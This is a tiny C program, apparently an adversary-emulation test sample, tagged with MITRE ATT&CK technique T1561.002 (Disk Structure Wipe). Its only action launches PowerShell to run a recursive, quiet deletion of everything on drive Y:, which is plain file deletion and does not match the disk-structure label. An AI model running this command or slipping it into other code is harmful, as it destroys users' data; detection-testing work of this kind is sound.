// Link      = https://attack.mitre.org/techniques/T1561/002/
// Technique = Disk Wipe: Disk Structure Wipe
// ID        = T1561.002
// Tactics   = Impact

#include <windows.h>

#define RUN(toRun) WinExec("powershell -Command \"& { " toRun " }\"", SW_SHOW);

int main() {
    RUN("del /s /q Y:\\*");
    return 0;
}